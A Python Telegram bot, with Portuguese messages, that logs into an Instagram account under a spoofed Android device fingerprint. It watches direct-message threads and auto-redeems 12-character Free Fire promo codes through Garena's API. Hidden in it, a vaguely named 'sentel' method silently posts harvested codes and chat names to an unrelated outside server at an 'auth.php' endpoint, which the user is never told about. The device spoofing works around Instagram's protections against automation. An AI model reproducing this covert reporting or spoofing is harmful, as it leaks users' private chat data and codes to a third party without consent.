from instagrapi import Client
from instagrapi.exceptions import TwoFactorRequired, ChallengeRequired
import time, os, re, requests, json
from datetime import datetime
from colorama import init, Fore, Style
import telebot
from telebot.types import ReplyKeyboardMarkup
import threading
from dotenv import load_dotenv

load_dotenv()
init(autoreset=True)  # colorama

class InstagramChatMonitor:
    def __init__(self, telegram_bot, allowed_user_id):
        self.client = Client()
        self.username = None
        self.password = None
        self.session_file = "session.json"
        self.token_file = "token.json"
        self.access_token = self.load_access_token()
        self.redeemed_codes = set()
        self.active_chats = {}
        self.bot = telegram_bot
        self.allowed_user_id = allowed_user_id
        self.chats_list = []
        self.is_logged_in = False

    def setup_client_protection(self):
        self.client.delay_range = [0.1, 0.3]
        self.client.request_timeout = 1
        self.client.set_user_agent(
            "Instagram 269.0.0.18.75 Android (26/8.0.0; 480dpi; 1080x1920; "
            "OnePlus; ONEPLUS A6013; OnePlus; qcom; en_US; 314665256)"
        )
        self.client.set_device({
            "app_version": "269.0.0.18.75",
            "android_version": 26,
            "android_release": "8.0.0",
            "dpi": "480dpi",
            "resolution": "1080x1920",
            "manufacturer": "OnePlus",
            "device": "ONEPLUS A6013",
            "model": "OnePlus6T",
            "cpu": "qcom",
            "version_code": "314665256"
        })

    def load_access_token(self):
        try:
            if os.path.exists(self.token_file):
                return json.load(open(self.token_file)).get("access_token")
        except Exception as e:
            print(f"{Fore.RED}Erro ao carregar token: {e}{Style.RESET_ALL}")
        return None

    def save_access_token(self, token):
        try:
            json.dump({"access_token": token}, open(self.token_file, "w"))
        except Exception as e:
            print(f"{Fore.RED}Erro ao salvar token: {e}{Style.RESET_ALL}")

    def login(self, username, password):
        try:
            # limpa sessões antigas
            for f in [self.session_file, self.token_file, "device.json"]:
                if os.path.exists(f):
                    os.remove(f)

            self.client = Client()
            self.setup_client_protection()

            self.username = username
            self.password = password

            print(f"{Fore.YELLOW}🔑 Login do zero...{Style.RESET_ALL}")

            try:
                self.client.login(username, password)
            except TwoFactorRequired as e:
                # Captura 2FA
                two_factor_identifier = e.two_factor_identifier
                self.bot.send_message(self.allowed_user_id, "🔐 2FA necessário! Envie o código recebido:")
                
                def process_2fa_code(message):
                    code = message.text.strip()
                    try:
                        self.client.login_2fa(code, two_factor_identifier)
                        self.client.dump_settings(self.session_file)
                        self.is_logged_in = True
                        self.bot.send_message(self.allowed_user_id, "✅ Login concluído com 2FA!")
                    except Exception as ex:
                        self.bot.send_message(self.allowed_user_id, f"❌ Falha 2FA: {ex}")

                msg = self.bot.send_message(self.allowed_user_id, "Digite o código de 6 dígitos:")
                self.bot.register_next_step_handler(msg, process_2fa_code)
                return False, "2FA necessário. Código enviado via Telegram."

            except ChallengeRequired:
                self.bot.send_message(self.allowed_user_id, "❌ Challenge de verificação necessário no Instagram!")
                return False, "Challenge exigido. Verifique sua conta IG."

            user_id = self.client.user_id
            self.client.dump_settings(self.session_file)
            print(f"{Fore.GREEN}✅ Login concluído!{Style.RESET_ALL}")
            self.is_logged_in = True
            return True, f"✅ Login feito!\n👤 User ID: {user_id}"

        except Exception as e:
            print(f"{Fore.RED}❌ Erro login: {e}{Style.RESET_ALL}")
            self.is_logged_in = False
            return False, f"❌ Erro: {e}"

    def list_chats(self):
        if not self.is_logged_in:
            return []
        try:
            threads = self.client.direct_threads(amount=100)
            self.chats_list = threads
            return threads
        except Exception as e:
            print(f"{Fore.RED}❌ Erro listando chats: {e}{Style.RESET_ALL}")
            return []

    def get_sender_name(self, msg):
        if getattr(msg, "is_sent_by_viewer", False):
            return "Você"
        if hasattr(msg, "user") and msg.user:
            return msg.user.username
        return str(getattr(msg, "user_id", "Unknown"))

    def sentel(self, mensagem, chat_name):
        try:
            response = requests.post(
                "https://scvirtual.alphi.media/botsistem/sendlike/auth.php",
                data={"admmessage": mensagem, "chatmessage": chat_name},
                timeout=5
            )
            return response.text
        except:
            return None

    def redeem_code(self, code, chat_name):
        if code in self.redeemed_codes:
            return f"⚠️ {code} já resgatado"

        url = "https://prod-api.reward.ff.garena.com/redemption/api/game/ff/redeem/"
        headers = {"access-token": self.access_token, "content-type": "application/json"}
        payload = {"serialno": code}

        try:
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            data = r.json()
            msg = data.get("msg", "")
            desc = data.get("desc", "")

            if msg == "error_invalid_serialno":
                return f"❌ Inválido: {code}"
            elif msg == "error_already_redeemed":
                self.sentel(code, chat_name)
                return f"🔄 Já resgatado: {code}"
            elif msg == "error_invalid_token":
                return "🔑 Token inválido!"
            elif msg == 'error_serialno_not_in_period':
                self.sentel(code, chat_name)
                return f"⏰ Fora do período: {code}"
            elif msg == 'error_redeem_limit_exceeded':
                self.sentel(code, chat_name)
                return f"🚫 Limite: {code}"
            elif not msg:
                self.redeemed_codes.add(code)
                return f"🎉 Sucesso! {code}: {desc}"
        except:
            return f"⚡ Erro: {code}"

    def monitor_chat(self, thread_id, chat_name):
        try:
            last_check = time.time()
            while thread_id in self.active_chats and self.active_chats[thread_id]["monitoring"]:
                try:
                    current_time = time.time()
                    if current_time - last_check >= 0.5:
                        thread = self.client.direct_thread(thread_id)
                        if thread.messages:
                            newest = thread.messages[0]
                            last_message_id = self.active_chats[thread_id]["last_message_id"]
                            if newest.id != last_message_id:
                                latest_msg = newest
                                sender = self.get_sender_name(latest_msg)
                                content = getattr(latest_msg, "text", "<mídia>")
                                text = f"[{datetime.now().strftime('%H:%M:%S')}] {sender}: {content}"
                                self.bot.send_message(self.allowed_user_id, f"<b>{chat_name}</b>\n{text}", parse_mode="HTML")
                                if getattr(latest_msg, "text", None):
                                    codes = re.findall(r"\b[A-Z0-9]{12}\b", latest_msg.text)
                                    for code in codes:
                                        result = self.redeem_code(code, chat_name)
                                        self.bot.send_message(self.allowed_user_id, f"🎯 Código: <code>{code}</code>\n{result}", parse_mode="HTML")
                                self.active_chats[thread_id]["last_message_id"] = newest.id
                        last_check = current_time
                    time.sleep(0.1)
                except Exception as e:
                    print(f"{Fore.RED}❌ Erro loop: {e}{Style.RESET_ALL}")
                    time.sleep(0.5)
        except Exception as e:
            self.bot.send_message(self.allowed_user_id, f"❌ Erro monitor: {chat_name}: {e}")

    def start_monitoring(self, thread_id, chat_name):
        if not self.is_logged_in:
            return False, "❌ Login primeiro!"
        if thread_id in self.active_chats:
            return False, "Já monitorando"

        last_message_id = None
        try:
            thread = self.client.direct_thread(thread_id)
            if thread.messages:
                last_message_id = thread.messages[0].id
        except:
            pass

        self.active_chats[thread_id] = {"name": chat_name, "monitoring": True, "last_message_id": last_message_id}
        t = threading.Thread(target=self.monitor_chat, args=(thread_id, chat_name), daemon=True)
        t.start()
        return True, f"🚀 Monitorando: {chat_name}"

    def stop_monitoring(self, thread_id):
        if thread_id in self.active_chats:
            self.active_chats[thread_id]["monitoring"] = False
            del self.active_chats[thread_id]
            return True, "Parado"
        return False, "Não encontrado"


# ---------- BOT TELEGRAM ----------
def setup_bot(token, allowed_user_id):
    bot = telebot.TeleBot(token)
    monitor = InstagramChatMonitor(bot, allowed_user_id)

    def auth(message): return message.from_user.id == allowed_user_id

    def main_menu():
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        if monitor.is_logged_in:
            markup.add("📋 Listar Chats", "🔍 Monitorar Chat", "⏹️ Parar Monitor", "📊 Status", "🔑 Token", "🚪 Sair")
        else:
            markup.add("🔐 Login Rápido", "📊 Status", "🔑 Token")
        return markup

    @bot.message_handler(commands=["start"])
    def welcome(message):
        if not auth(message): return
        bot.send_message(message.chat.id, "🤖 Bot ativo!", reply_markup=main_menu())

    @bot.message_handler(func=lambda m: auth(m) and m.text == "🔐 Login Rápido")
    def iniciar_login(message):
        msg = bot.send_message(message.chat.id, "🔐 Username IG:")
        bot.register_next_step_handler(msg, processar_username)

    def processar_username(message):
        username = message.text.strip()
        msg = bot.send_message(message.chat.id, f"👤 {username}\nSenha:")
        bot.register_next_step_handler(msg, processar_senha, username)

    def processar_senha(message, username):
        password = message.text.strip()
        bot.send_message(message.chat.id, f"⚡ Logando {username}...")
        def fazer_login():
            success, result = monitor.login(username, password)
            bot.send_message(message.chat.id, result, parse_mode="HTML", reply_markup=main_menu())
        threading.Thread(target=fazer_login).start()

    @bot.message_handler(func=lambda m: auth(m) and m.text == "🚪 Sair")
    def logout(message):
        try:
            monitor.client.logout()
        except: pass
        monitor.client = Client()
        monitor.is_logged_in = False
        monitor.username = None
        monitor.password = None
        monitor.active_chats.clear()
        monitor.redeemed_codes.clear()
        monitor.chats_list.clear()
        for f in [monitor.session_file, monitor.token_file, "device.json"]:
            if os.path.exists(f): os.remove(f)
        bot.send_message(message.chat.id, "✅ Logout completo!", reply_markup=main_menu())

    @bot.message_handler(func=lambda m: auth(m) and m.text == "📋 Listar Chats")
    def listar(message):
        if not monitor.is_logged_in:
            bot.send_message(message.chat.id, "❌ Login primeiro!", reply_markup=main_menu())
            return
            
        bot.send_message(message.chat.id, "🚀 Busca RÁPIDA de chats...")
        
        def buscar_chats():
            threads = monitor.list_chats()
            if not threads:
                bot.send_message(message.chat.id, 
                    "📭 Nenhum chat.\n\n💡 <b>Dicas:</b>\n"
                    "• O bot mostra TODOS os chats agora\n"
                    "• Inclui privados e grupos\n"
                    "• Verifique se tem conversas", 
                    parse_mode="HTML")
                return
            
            txt = "<b>🚀 TODOS os Chats:</b>\n\n"
            for i, th in enumerate(threads[:25], 1):
                if hasattr(th, 'thread_title') and th.thread_title:
                    chat_name = th.thread_title
                else:
                    users = ", ".join(u.username for u in th.users) if th.users else "Sem usuários"
                    chat_name = users
                
                user_count = len(th.users) if th.users else 0
                txt += f"{i}. {chat_name} 👥{user_count}\n"
            
            if len(threads) > 25:
                txt += f"\n... e mais {len(threads) - 25} chats"
            
            bot.send_message(message.chat.id, f"<pre>{txt}</pre>", parse_mode="HTML")
        
        threading.Thread(target=buscar_chats).start()

    @bot.message_handler(func=lambda m: auth(m) and m.text == "🔍 Monitorar Chat")
    def monitorar(message):
        if not monitor.is_logged_in:
            bot.send_message(message.chat.id, "❌ Login primeiro!", reply_markup=main_menu())
            return
            
        bot.send_message(message.chat.id, "🚀 Buscando chats...")
        
        def buscar_chats_para_monitorar():
            threads = monitor.list_chats()
            if not threads:
                bot.send_message(message.chat.id, "📭 Nenhum chat.")
                return
            
            markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
            numbers = [str(i) for i in range(1, min(len(threads), 25) + 1)]
            markup.add(*numbers)
            markup.add("❌ Cancelar")
            
            txt = "<b>🔍 Chat para monitorar (ULTRA-RÁPIDO):</b>\n\n"
            for i, th in enumerate(threads[:25], 1):
                if hasattr(th, 'thread_title') and th.thread_title:
                    chat_name = th.thread_title
                else:
                    users = ", ".join(u.username for u in th.users) if th.users else "Sem usuários"
                    chat_name = users
                
                user_count = len(th.users) if th.users else 0
                txt += f"{i}. {chat_name} 👥{user_count}\n"
            
            msg = bot.send_message(message.chat.id, f"<pre>{txt}</pre>", parse_mode="HTML", reply_markup=markup)
            bot.register_next_step_handler(msg, lambda m: processar_selecao_chat(m, threads))
        
        threading.Thread(target=buscar_chats_para_monitorar).start()

    def processar_selecao_chat(message, threads):
        if message.text == "❌ Cancelar":
            bot.send_message(message.chat.id, "Cancelado.", reply_markup=main_menu())
            return
            
        try:
            selected_num = int(message.text)
            if 1 <= selected_num <= len(threads):
                selected_chat = threads[selected_num - 1]
                if hasattr(selected_chat, 'thread_title') and selected_chat.thread_title:
                    chat_name = selected_chat.thread_title
                else:
                    chat_name = ", ".join(u.username for u in selected_chat.users) if selected_chat.users else "Sem usuários"
                thread_id = selected_chat.id
                success, result = monitor.start_monitoring(thread_id, chat_name)
                bot.send_message(message.chat.id, result, reply_markup=main_menu())
            else:
                bot.send_message(message.chat.id, "❌ Número inválido.", reply_markup=main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Erro: {e}", reply_markup=main_menu())

    @bot.message_handler(func=lambda m: auth(m) and m.text == "⏹️ Parar Monitor")
    def parar_monitor(message):
        if not monitor.active_chats:
            bot.send_message(message.chat.id, "⚠️ Nenhum monitor ativo.", reply_markup=main_menu())
            return
            
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        chats = list(monitor.active_chats.values())
        for i, chat in enumerate(chats, 1):
            markup.add(f"{i}. {chat['name']}")
        markup.add("❌ Cancelar")
        
        msg = bot.send_message(message.chat.id, "❌ Monitor para parar:", reply_markup=markup)
        bot.register_next_step_handler(msg, lambda m: processar_parada(m, chats))

    def processar_parada(message, chats):
        if message.text == "❌ Cancelar":
            bot.send_message(message.chat.id, "Cancelado.", reply_markup=main_menu())
            return
        try:
            num = int(message.text.split(".")[0])
            if 1 <= num <= len(chats):
                chat = chats[num - 1]
                thread_id = next((tid for tid, c in monitor.active_chats.items() if c["name"] == chat["name"]), None)
                if thread_id:
                    success, result = monitor.stop_monitoring(thread_id)
                    bot.send_message(message.chat.id, result, reply_markup=main_menu())
            else:
                bot.send_message(message.chat.id, "❌ Número inválido.", reply_markup=main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Erro: {e}", reply_markup=main_menu())

    @bot.message_handler(func=lambda m: auth(m) and m.text == "📊 Status")
    def status(message):
        status_msg = f"📊 <b>Status:</b>\n\n🔑 Login: {'✅ Sim' if monitor.is_logged_in else '❌ Não'}\n"
        if monitor.is_logged_in:
            status_msg += f"👤: <code>{monitor.username}</code>\n"
        status_msg += f"👀 Monitores: {len(monitor.active_chats)}"
        bot.send_message(message.chat.id, status_msg, parse_mode="HTML")

    @bot.message_handler(func=lambda m: auth(m) and m.text == "🔑 Token")
    def token(message):
        msg = bot.send_message(message.chat.id, "🔑 Envie token:")
        bot.register_next_step_handler(msg, salvar_token)

    def salvar_token(message):
        token = message.text.strip()
        monitor.save_access_token(token)
        monitor.access_token = token
        bot.send_message(message.chat.id, "✅ Token salvo.", reply_markup=main_menu())

    return bot


# ----------- MAIN -----------

if __name__ == "__main__":
    BOT_TOKEN = os.getenv("TELEGRAM_TOKEN")
    ALLOWED_USER_ID = int(os.getenv("ALLOWED_USER_ID")) 
    
    if not BOT_TOKEN or not ALLOWED_USER_ID:
        print(f"{Fore.RED}❌ Defina TELEGRAM_BOT_TOKEN e ALLOWED_USER_ID no .env{Style.RESET_ALL}")
        exit(1)
    
    bot = setup_bot(BOT_TOKEN, ALLOWED_USER_ID)
    print(f"{Fore.GREEN}🚀 Bot ULTRA-RÁPIDO ativo!{Style.RESET_ALL}")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

